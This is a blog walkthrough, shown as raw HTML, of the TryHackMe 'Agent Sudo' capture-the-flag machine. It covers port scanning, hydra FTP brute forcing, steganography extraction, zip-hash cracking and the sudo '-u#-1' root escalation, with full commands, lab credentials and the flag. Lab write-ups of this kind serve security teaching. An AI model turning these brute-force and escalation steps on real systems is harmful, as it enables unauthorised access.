<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe - Agent Sudo | Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)</title><meta name=keywords content="ftp,ssh,http,rustscan,enumeration,hydra-ftp-bruteforcing,steganography,john-zip-cracking,privesc,sudo-exploitation"><meta name=description content="Walkthrough of the boot2root machine Agent Sudo on TryHackMe - https://tryhackme.com/room/agentsudoctf"><meta name=author content="Umar_0x01"><link rel=canonical href=https://umar0x01.sh/post/thm-agent_sudo/><meta name=google-site-verification content="GTM-TZKBTKP"><link crossorigin=anonymous href=/assets/css/stylesheet.min.59f065735d47f1e8b3aab68fc9c773b722b5adf3f4e6096c42e8a1f8db8b3822.css integrity="sha256-WfBlc11H8eizqraPycdztyK1rfP05glsQuih+NuLOCI=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://umar0x01.sh/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://umar0x01.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://umar0x01.sh/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://umar0x01.sh/favicon/apple-touch-icon.png><link rel=mask-icon href=https://umar0x01.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-177361132-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="TryHackMe - Agent Sudo"><meta property="og:description" content="Walkthrough of the boot2root machine Agent Sudo on TryHackMe - https://tryhackme.com/room/agentsudoctf"><meta property="og:type" content="article"><meta property="og:url" content="https://umar0x01.sh/post/thm-agent_sudo/"><meta property="og:image" content="https://umar0x01.sh/images/thm-simple_ctf/Untitled%203.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-18T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-18T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://umar0x01.sh/images/thm-simple_ctf/Untitled%203.png"><meta name=twitter:title content="TryHackMe - Agent Sudo"><meta name=twitter:description content="Walkthrough of the boot2root machine Agent Sudo on TryHackMe - https://tryhackme.com/room/agentsudoctf"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://umar0x01.sh/post/"},{"@type":"ListItem","position":3,"name":"TryHackMe - Agent Sudo","item":"https://umar0x01.sh/post/thm-agent_sudo/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Agent Sudo","name":"TryHackMe - Agent Sudo","description":"Walkthrough of the boot2root machine Agent Sudo on TryHackMe - https://tryhackme.com/room/agentsudoctf","keywords":["ftp","ssh","http","rustscan","enumeration","hydra-ftp-bruteforcing","steganography","john-zip-cracking","privesc","sudo-exploitation"],"articleBody":"Agent Sudo Enumeration  Link: https://tryhackme.com/room/agentsudoctf\nAuthor: https://tryhackme.com/p/DesKel\nHost: 10.10.107.2\n Letâ€™s start off with rustscan against the host to quickly get the open ports.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# rustscan -a 10.10.107.2 --ulimit 5000 -b 4500 -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-' The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan :  -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan  [~] The config file is expected to be at \"/root/.rustscan.toml\" [~] Automatically increasing ulimit value to 5000. Open 10.10.107.2:21 Open 10.10.107.2:22 Open 10.10.107.2:80 . FTP - Port 21 Checking the FTP port, connecting to it, trying anonymous user, didnâ€™t work out!\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# ftp 10.10.107.2 Connected to 10.10.107.2. 220 (vsFTPd 3.0.3) Name (10.10.107.2:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp 221 Goodbye.  HTTP - Port 80 Letâ€™s check whatâ€™s hosted on the HTTP host.\nNothing much, letâ€™s follow whatâ€™s told in the page maybe? Letâ€™s try passing the User-Agent header in request.\nLetâ€™s try the agent R given in the page as user-agent.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# curl -i -X GET http://10.10.107.2/ -H 'User-Agent: R' HTTP/1.1 200 OK Date: Sat, 17 Apr 2021 18:45:28 GMT Server: Apache/2.4.29 (Ubuntu) Vary: Accept-Encoding Content-Length: 310 Content-Type: text/html; charset=UTF-8 What are you doing! Are you one of the 25 employees? If not, I going to report this incident DocType html html head titleAnnoucementtitle head body p Dear agents, brbr Use your own bcodenameb as user-agent to access the site. brbr From,br Agent R p body html  What are you doing! Are you one of the 25 employees? If not, I going to report this incident\n Alright, thatâ€™s one thing, maybe try enumerating this manually for 3-4 alphabets starting from A? If nothingâ€™s found, letâ€™s continue writing a for loop to automate this.\nVisiting with User-Agent: C we get another header in the page: Location\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# curl -i -X GET http://10.10.107.2/ -H 'User-Agent: C' HTTP/1.1 302 Found Date: Sat, 17 Apr 2021 18:47:04 GMT Server: Apache/2.4.29 (Ubuntu) Location: agent_C_attention.php Content-Length: 218 Content-Type: text/html; charset=UTF-8 DocType html html head titleAnnoucementtitle head body p Dear agents, brbr Use your own bcodenameb as user-agent to access the site. brbr From,br Agent R p body html  Location: agent_C_attention.php\n Visiting the page, we get:\nAlright, we get two usernames from this page: J and chris. Tried J as User-Agent in the request, nothing really happened!\nMaybe weâ€™re supposed to bruteforce these credentials? Letâ€™s try that against the FTP port since we werenâ€™t able to use anonymous user before!\nBruteforcing Port 21 - FTP Letâ€™s use hydra against the host with rockyou.txt wordlist. We get the results in 2-3 minutes!\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.107.2 -s 21 ftp -t 16 130 â¨¯ Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-17 23:50:24 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ftp://10.10.107.2:21/ [STATUS] 152.00 tries/min, 152 tries in 00:01h, 14344247 to do in 1572:51h, 16 active [21][ftp] host: 10.10.107.2 login: chris password: crystal 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-17 23:52:12 Alright, chris:crsytal are the credentials of FTP, letâ€™s connect and see whatâ€™s in there for us.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# ftp 10.10.107.2 Connected to 10.10.107.2. 220 (vsFTPd 3.0.3) Name (10.10.107.2:root): chris 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png 226 Directory send OK. ftp get To_agentJ.txt local: To_agentJ.txt remote: To_agentJ.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes). 226 Transfer complete. 217 bytes received in 0.00 secs (211.2802 kB/s) ftp get cute-alien.jpg local: cute-alien.jpg remote: cute-alien.jpg 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes). 226 Transfer complete. 33143 bytes received in 0.30 secs (107.2144 kB/s) ftp get cutie.png local: cutie.png remote: cutie.png 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for cutie.png (34842 bytes). 226 Transfer complete. 34842 bytes received in 0.32 secs (106.3596 kB/s) Letâ€™s go through the contents!\nThe .txt file contains:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you. From, Agent C Checking file types:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# file * cute-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3 cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced To_agentJ.txt: ASCII text I think weâ€™re now supposed to find stuff inside the images! Little bit of steganography?\n Finding contents inside the images Running binwalk on the two images, we get:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# binwalk cute-alien.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# binwalk cutie.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced 869 0x365 Zlib compressed data, best compression 34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt 34820 0x8804 End of Zip archive, footer length: 22 Cutie.png is what we need! Letâ€™s extract the zip file from the image.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# binwalk -e cutie.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced 869 0x365 Zlib compressed data, best compression 34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt 34820 0x8804 End of Zip archive, footer length: 22 â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# ls -al total 80 drwxr-xr-x 1 umar0x01 umar0x01 4096 Apr 17 23:58 . drwxrwxr-x 1 umar0x01 umar0x01 4096 Apr 17 23:35 .. -rw-r--r-- 1 umar0x01 umar0x01 33143 Apr 17 23:53 cute-alien.jpg -rw-r--r-- 1 umar0x01 umar0x01 34842 Apr 17 23:53 cutie.png drwxr-xr-x 1 umar0x01 umar0x01 4096 Apr 17 23:58 _cutie.png.extracted -rw-r--r-- 1 umar0x01 umar0x01 217 Apr 17 23:53 To_agentJ.txt â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# cd _cutie.png.extracted â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# ls -al total 315 drwxr-xr-x 1 umar0x01 umar0x01 4096 Apr 17 23:58 . drwxr-xr-x 1 umar0x01 umar0x01 4096 Apr 17 23:58 .. -rw-r--r-- 1 umar0x01 umar0x01 279312 Apr 17 23:58 365 -rw-r--r-- 1 umar0x01 umar0x01 33973 Apr 17 23:58 365.zlib -rw-r--r-- 1 umar0x01 umar0x01 280 Apr 17 23:58 8702.zip -rw-r--r-- 1 umar0x01 umar0x01 0 Oct 29 2019 To_agentR.txt â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# file * 365: data 365.zlib: zlib compressed data 8702.zip: Zip archive data, at least v5.1 to extract To_agentR.txt: empty Alright, letâ€™s try unzipping the file 8702.zip\nTrying to extract the files, thereâ€™s a password on the .zip file. Letâ€™s try using john to crack it.\nWe can zip2john to convert it into a crackable format for john.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# zip2john 8702.zip  zip.hsah ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# cat zip.hsah 8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0 b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip Letâ€™s use john on it now!\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# john zip.hsah Using default input encoding: UTF-8 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 11 candidates buffered for the current salt, minimum 32 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist alien (8702.zip/To_agentR.txt) 1g 0:00:00:00 DONE 2/3 (2021-04-18 00:00) 1.449g/s 65284p/s 65284c/s 65284C/s 123456..ferrises Use the \"--show\" option to display all of the cracked passwords reliably Session completed Awesome, letâ€™s use alien as password to decrypt and extract the .zip file. Got the contents of the file:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# cat To_agentR.txt Agent C, We need to send the picture to 'QXJlYTUx' as soon as possible! By, Agent R Alright, since we donâ€™t know the encoding type of QXJlYTUx, we can use decoder (self-promotion hehe) to find it.\nLetâ€™s install and use it:\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# pip3 install decoder 130 â¨¯ Collecting decoder Downloading decoder-0.5.tar.gz (5.2 kB) Collecting pycipher Downloading pycipher-0.5.2.zip (45 kB) |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 45 kB 401 kB/s Requirement already satisfied: termcolor in /usr/lib/python3/dist-packages (from decoder) (1.1.0) Building wheels for collected packages: decoder, pycipher Building wheel for decoder (setup.py) ... done Created wheel for decoder: filename=decoder-0.5-py3-none-any.whl size=5273 sha256=0264304102d941c39dec2b4ee3c2bb0c6e0359e4d7c3f81199d2bbd4fbe93958 Stored in directory: /root/.cache/pip/wheels/45/0d/2f/e717eed1e3663cf3c6db4ea1fbea0373c104bcba6d0504f393 Building wheel for pycipher (setup.py) ... done Created wheel for pycipher: filename=pycipher-0.5.2-py3-none-any.whl size=30458 sha256=af72bf4bbe7785b32183698ee3f5a655f22e1e53230104ca4a823594c83dec47 Stored in directory: /root/.cache/pip/wheels/ca/e7/37/bf758675337f9b98f096d8f7a5fd0cf320aadd67ae8a12f545 Successfully built decoder pycipher Installing collected packages: pycipher, decoder Successfully installed decoder-0.5 pycipher-0.5.2 â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo/_cutie.png.extracted] â””â”€# decoder -s QXJlYTUx ________ .___ \\______ \\ ____ ____ ____ __| _/___________ | | \\_/ __ \\_/ ___\\/ _ \\ / __ |/ __ \\_ __ \\ | ` \\ ___/\\ \\__( _ ) /_/ \\ ___/| | \\/ /_______ /\\___ \\___ ____/\\____ |\\___ __| \\/ \\/ \\/ \\/ \\/ Automate the Manual :) --- [#] Provided string: QXJlYTUx --- ------------------------------------------------------- [%] Base Encodings (16 - 85) [+] Base64 decoded: Area51 ------------------------------------------------------- [%] Common Encodings [+] AtBash decoded: JCQOBGFC Alright, it was base64 and it decodes to Area51. Letâ€™s try and use this password with steghide on the other .png file now.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# steghide extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \"message.txt\". â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# ls -al total 84 drwxr-xr-x 1 umar0x01 umar0x01 4096 Apr 18 00:08 . drwxrwxr-x 1 umar0x01 umar0x01 4096 Apr 18 00:06 .. -rw-r--r-- 1 umar0x01 umar0x01 33143 Apr 17 23:53 cute-alien.jpg -rw-r--r-- 1 umar0x01 umar0x01 34842 Apr 17 23:53 cutie.png drwxr-xr-x 1 umar0x01 umar0x01 4096 Apr 18 00:02 _cutie.png.extracted -rw-r--r-- 1 umar0x01 umar0x01 181 Apr 18 00:08 message.txt drwxr-xr-- 1 umar0x01 umar0x01 4096 Apr 18 00:06 output -rw-r--r-- 1 umar0x01 umar0x01 217 Apr 17 23:53 To_agentJ.txt â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# cat message.txt Hi james, Glad you find this message. Your login password is hackerrules! Don't ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris Awesome! We got SSH credentials. Letâ€™s now SSH as user james with password hackerrules!\n Initial User Alright, we got james with the above credentials!\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# ssh james@10.10.107.2 255 â¨¯ The authenticity of host '10.10.107.2 (10.10.107.2)' can't be established. ECDSA key fingerprint is SHA256:yr7mJyy+j1G257OVtst3Zkl+zFQw8ZIBRmfLi7fX/D8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.107.2' (ECDSA) to the list of known hosts. james@10.10.107.2's password: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64) * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage  System information as of Sat Apr 17 19:09:45 UTC 2021 System load: 0.0 Processes: 95 Usage of /: 39.7% of 9.78GB Users logged in: 0 Memory usage: 33% IP address for eth0: 10.10.107.2 Swap usage: 0% 75 packages can be updated. 33 updates are security updates. Last login: Tue Oct 29 14:26:27 2019 james@agent-sudo:~$ id uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd) We can already see from id that it has lxd privileges â€” Letâ€™s search for the lxd exploit!\n Privileges Escalation Letâ€™s run searchsploit against it.\nâ”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Agent Sudo] â””â”€# searchsploit lxd --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Ubuntu 18.04 - 'lxd' Privilege Escalation | linux/local/46978.sh --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results I was able to root the system utilizing the above exploit^ but it seems the machine requires something else :|\nRunning sudo -l we can see that we canâ€™t run a binary as root. Also remember the machine name lol? Letâ€™s look for sudo agent exploit.\njames@agent-sudo:~$ sudo -l [sudo] password for james: Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash james@agent-sudo:~$ james@agent-sudo:~$ sudo bash Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo. Searching the exploit, we find out that there is one having same description!\nhttps://www.exploit-db.com/exploits/47502\nFrom the exploit description, we can exploit it using:\nhacker@kali:~$ sudo -u#-1 /bin/bash root@kali:/home/hacker# id Root Shell! Letâ€™s run this on the machine:\njames@agent-sudo:~$ sudo -u#-1 /bin/bash root@agent-sudo:~# root@agent-sudo:~# root@agent-sudo:~# root@agent-sudo:~# id uid=0(root) gid=1000(james) groups=1000(james) root@agent-sudo:~# cd /root/ root@agent-sudo:/root# ls -al total 32 drwx------ 4 root root 4096 Oct 29 2019 . drwxr-xr-x 24 root root 4096 Oct 29 2019 .. -rw------- 1 root root 1952 Oct 29 2019 .bash_history -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwxr-xr-x 3 root root 4096 Oct 29 2019 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 197 Oct 29 2019 root.txt drwx------ 2 root root 4096 Oct 29 2019 .ssh Alright, we got root.txt!\nroot@agent-sudo:/root# cat root.txt To Mr.hacker, Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. Your flag is b53a02f55b57d4439e3341834d70c062 By, DesKel a.k.a Agent R  (Bonus) Who is Agent R?\n From the root.txt flag: DesKel\nThanks for reading! Hopefully you enjoyed this walkthrough.\n Note to self:  Always enumerate before bruteforcing (keep it as a last resort) Read through the hints on rooms (this one was really specific :|)  ","wordCount":"2248","inLanguage":"en","image":"https://umar0x01.sh/images/thm-simple_ctf/Untitled%203.png","datePublished":"2021-04-18T00:00:00Z","dateModified":"2021-04-18T00:00:00Z","author":{"@type":"Person","name":"Umar_0x01"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://umar0x01.sh/post/thm-agent_sudo/"},"publisher":{"@type":"Organization","name":"Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)","logo":{"@type":"ImageObject","url":"https://umar0x01.sh/favicon/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a class=label_text_header href=https://umar0x01.sh accesskey=h title="> umar_0x01 | blog (Alt + H)"><span id=cusor_blink>></span> umar_0x01 | blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://umar0x01.sh/archives/ title=Posts><span>Posts</span></a></li><li><a href=https://umar0x01.sh/anime/ title=Anime><span>Anime</span></a></li><li><a href=https://umar0x01.sh/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://umar0x01.sh/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://umar0x01.sh/tags/ title=Tags><span>Tags</span></a></li></ul></nav><script type=text/javascript>var cursor=!0,speed=500;setInterval(()=>{cursor?(document.getElementById('cusor_blink').style.opacity=0,cursor=!1):(document.getElementById('cusor_blink').style.opacity=1,cursor=!0)},speed)</script></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://umar0x01.sh>Home</a>&nbsp;Â»&nbsp;<a href=https://umar0x01.sh/post/>Posts</a></div><h1 class=post-title>TryHackMe - Agent Sudo</h1><div class=post-description>Walkthrough of the boot2root machine Agent Sudo on TryHackMe - https://tryhackme.com/room/agentsudoctf</div><div class=post-meta>April 18, 2021&nbsp;Â·&nbsp;11 min&nbsp;Â·&nbsp;Umar_0x01</div></header><div class=post-content><h1 id=agent-sudo>Agent Sudo<a hidden class=anchor aria-hidden=true href=#agent-sudo>#</a></h1><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><hr><p><strong>Link:</strong> <a href=https://tryhackme.com/room/agentsudoctf>https://tryhackme.com/room/agentsudoctf</a></p><p><strong>Author:</strong> <a href=https://tryhackme.com/p/DesKel>https://tryhackme.com/p/DesKel</a></p><p><strong>Host:</strong> 10.10.107.2</p><hr><p>Let&rsquo;s start off with <code>rustscan</code> against the host to quickly get the <strong>open ports</strong>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> rustscan <span style=color:#f92672>-</span>a <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span> <span style=color:#f92672>--</span>ulimit <span style=color:#ae81ff>5000</span> <span style=color:#f92672>-</span>b <span style=color:#ae81ff>4500</span> <span style=color:#f92672>--</span> <span style=color:#f92672>-</span>sC <span style=color:#f92672>-</span>sV
<span style=color:#f92672>.----.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.----..---.</span>  <span style=color:#f92672>.----.</span> <span style=color:#f92672>.---.</span>   <span style=color:#f92672>.--.</span>  <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span>
<span style=color:#f92672>|</span> <span style=color:#f92672>{}</span>  <span style=color:#f92672>}|</span> <span style=color:#f92672>{</span> <span style=color:#f92672>}</span> <span style=color:#f92672>|{</span> <span style=color:#f92672>{</span>__ <span style=color:#f92672>{</span>_   _<span style=color:#f92672>}{</span> <span style=color:#f92672>{</span>__  <span style=color:#f92672>/</span>  ___<span style=color:#f92672>}</span> <span style=color:#f92672>/</span> <span style=color:#f92672>{}</span> <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#f92672>|</span>  <span style=color:#e6db74>`| |
</span><span style=color:#e6db74>| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
</span><span style=color:#e6db74>`</span><span style=color:#f92672>-</span><span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#e6db74>`-&#39;`</span><span style=color:#f92672>-----</span><span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#e6db74>`----&#39;  `</span><span style=color:#f92672>-</span><span style=color:#960050;background-color:#1e0010>&#39;</span>  <span style=color:#e6db74>`----&#39;  `</span><span style=color:#f92672>---</span><span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#e6db74>`-&#39;  `</span><span style=color:#f92672>-</span><span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#e6db74>`-&#39; `</span><span style=color:#f92672>-</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
The Modern Day Port Scanner<span style=color:#f92672>.</span>
________________________________________
<span style=color:#f92672>:</span> https<span style=color:#f92672>:</span><span style=color:#75715e>//discord.gg/GFrQsGy           :
</span><span style=color:#75715e></span><span style=color:#f92672>:</span> https<span style=color:#f92672>:</span><span style=color:#75715e>//github.com/RustScan/RustScan :
</span><span style=color:#75715e></span> <span style=color:#f92672>--------------------------------------</span>
Please contribute more quotes to our GitHub https<span style=color:#f92672>:</span><span style=color:#75715e>//github.com/rustscan/rustscan
</span><span style=color:#75715e></span>
<span style=color:#f92672>[~]</span> The config file <span style=color:#66d9ef>is</span> expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
<span style=color:#f92672>[~]</span> Automatically increasing ulimit value to <span style=color:#ae81ff>5000.</span>
